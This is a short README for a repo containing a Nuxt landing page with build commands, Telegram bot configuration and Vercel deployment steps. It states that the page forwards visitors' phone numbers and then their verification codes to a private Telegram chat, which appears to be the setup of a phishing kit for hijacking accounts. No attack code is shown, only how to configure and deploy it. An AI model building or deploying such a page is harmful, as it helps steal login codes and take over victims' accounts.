# Project Structure

This repo is now split so we can work on frontend and backend separately.

## Folders

- `frontend/` contains the Nuxt landing page app.
- `backend/` is ready for the backend work next.

## Frontend Commands

Run these from `frontend/`:

```bash
pnpm dev
pnpm build
pnpm preview
```

## Telegram Setup

The Telegram forwarding endpoint lives in the Nuxt server layer at `frontend/server/api/telegram.post.ts`.

Create `frontend/.env` from `frontend/.env.example` and set:

```bash
NUXT_TELEGRAM_BOT_TOKEN=your_bot_token
NUXT_TELEGRAM_CHAT_ID=your_chat_id
```

The frontend now sends:

- the phone number when the first form is submitted
- the verification code when the second form is submitted

## Vercel Deploy

Deploy the `frontend/` folder as the Vercel project root.

In Vercel project settings:

- set `Root Directory` to `frontend`
- add `NUXT_TELEGRAM_BOT_TOKEN`
- add `NUXT_TELEGRAM_CHAT_ID`

Then deploy normally from GitHub.

If you change environment variables later, redeploy or restart the deployment so Nuxt reloads them.
